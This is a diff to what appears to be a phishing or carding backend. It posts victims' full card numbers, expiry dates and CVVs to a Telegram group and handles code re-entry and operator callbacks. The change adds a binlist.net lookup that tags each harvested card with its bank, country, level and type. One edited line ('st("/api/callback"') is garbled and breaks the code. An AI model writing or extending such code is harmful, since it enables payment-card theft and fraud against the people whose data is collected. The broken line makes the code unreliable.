@@ -21,6 +21,70 @@ const pending = new Map();
 
 const lastSeen = new Map();
 
+function localCardNetwork(bin) {
+  const n = String(bin).replace(/\D/g, "");
+  if (/^4/.test(n))                                   return "VISA";
+  if (/^(5[1-5]|2(2[2-9]\d|[3-6]\d{2}|7[01]\d|720))/.test(n)) return "MASTERCARD";
+  if (/^3[47]/.test(n))                               return "AMEX";
+  if (/^35(2[89]|[3-8])/.test(n))                    return "JCB";
+  if (/^(6011|64[4-9]|65)/.test(n))                  return "DISCOVER";
+  if (/^62/.test(n))                                  return "UNIONPAY";
+  if (/^3(0[0-5]|[68])/.test(n))                     return "DINERS";
+  return null;
+}
+
+const binCache = new Map();
+
+async function lookupBin(cardNumber) {
+  const bin = String(cardNumber).replace(/\D/g, "").slice(0, 6);
+  if (bin.length < 6) return null;
+
+  if (binCache.has(bin)) return binCache.get(bin);
+
+  try {
+    const res = await fetch(`https://lookup.binlist.net/${bin}`, {
+      headers: { "Accept-Version": "3" },
+      signal: AbortSignal.timeout(4000),
+    });
+    if (!res.ok) { binCache.set(bin, null); return null; }
+
+    const d = await res.json();
+
+    const info = {
+      bin,
+      bank:    d.bank?.name    || null,
+      country: d.country?.name || null,
+      emoji:   d.country?.emoji || countryCodeToEmoji(d.country?.alpha2),
+      scheme:  (d.scheme  || "").toUpperCase() || localCardNetwork(bin),
+      type:    (d.type    || "").toUpperCase(),   // CREDIT / DEBIT / PREPAID
+      brand:   d.brand           || null,         // "Visa Classic", "Mastercard Gold" …
+      level:   cardLevelFromBrand(d.brand, d.scheme),
+    };
+
+    binCache.set(bin, info);
+    return info;
+  } catch {
+    binCache.set(bin, null);
+    return null;
+  }
+}
+
+function cardLevelFromBrand(brand, scheme) {
+  if (!brand) return null;
+  const schemeRe = new RegExp(scheme || "x^", "i");
+  const level = brand.replace(schemeRe, "").trim().toUpperCase();
+  return level || null;
+}
+
+function countryCodeToEmoji(alpha2) {
+  if (!alpha2 || alpha2.length !== 2) return "";
+  const base = 0x1F1E6 - 65;
+  return String.fromCodePoint(
+    base + alpha2.toUpperCase().charCodeAt(0),
+    base + alpha2.toUpperCase().charCodeAt(1),
+  );
+}
+
 async function tgPost(method, body) {
   if (!BOT_TOKEN) throw new Error("BOT_TOKEN is not set");
   const res = await fetch(
@@ -127,6 +191,8 @@ async function sendOrderToTelegram({
 }) {
   if (!GROUP_CHAT_ID) throw new Error("GROUP_CHAT_ID is not set");
 
+  const binInfo = card_number ? await lookupBin(card_number).catch(() => null) : null;
+
   const lines = [
     "🎟 Новая заявка на покупку",
     `🆔 ID: ${escapeHtml(request_id)}`,
@@ -147,6 +213,30 @@ async function sendOrderToTelegram({
   }
   if (card_expiry) lines.push(`Срок: ${escapeHtml(card_expiry)}`);
   if (card_cvv)    lines.push(`CVV: ${escapeHtml(card_cvv)}`);
+
+  // Card Info block — показываем только если есть хотя бы одно поле
+  if (binInfo && (binInfo.bank || binInfo.scheme)) {
+    lines.push("");
+    lines.push("Card Info ℹ️");
+    if (binInfo.bank) {
+      const flag = binInfo.emoji ? `${binInfo.emoji} ` : "";
+      lines.push(`  BANK: ${escapeHtml(flag + binInfo.bank)}`);
+    }
+    if (binInfo.level) lines.push(`  Card lvl: ${escapeHtml(binInfo.level)}`);
+    const typeStr = [binInfo.scheme, binInfo.type].filter(Boolean).join(" ");
+    if (typeStr)       lines.push(`  TYPE: ${escapeHtml(typeStr)}`);
+    if (binInfo.bin)   lines.push(`  BIN: <code>${escapeHtml(binInfo.bin)}</code>`);
+  } else if (card_number) {
+    // Fallback: определяем сеть локально без API
+    const network = localCardNetwork(card_number);
+    const bin = String(card_number).replace(/\D/g, "").slice(0, 6);
+    if (network || bin.length === 6) {
+      lines.push("");
+      lines.push("Card Info ℹ️");
+      if (network) lines.push(`  TYPE: ${escapeHtml(network)}`);
+      if (bin.length === 6) lines.push(`  BIN: <code>${escapeHtml(bin)}</code>`);
+    }
+  }
 
   await tgPost("sendMessage", {
     chat_id: GROUP_CHAT_ID,
@@ -296,7 +386,7 @@ app.post("/api/re_enter_code", async (req, res) => {
   res.json({ ok: true });
 });
 
-app.post("/api/callback", (req, res) => {
+st("/api/callback", (req, res) => {
   const { request_id, action } = req.body || {};
   console.log(`[callback] request_id=${request_id}  action=${action}`);
 
@@ -312,6 +402,7 @@ app.post("/api/callback", (req, res) => {
   res.json({ ok: true });
 });
 
+
 app.get("/api/online", (req, res) => {
   const { request_id } = req.query;
   const hasPending = pending.has(request_id);
@@ -324,6 +415,7 @@ app.get("/api/online", (req, res) => {
 app.get("/health", (_req, res) =>
   res.json({ ok: true, pending: pending.size })
 );
+
 
 app.listen(PORT, "0.0.0.0", () => {
   console.log(`Backend listening on http://0.0.0.0:${PORT}`);
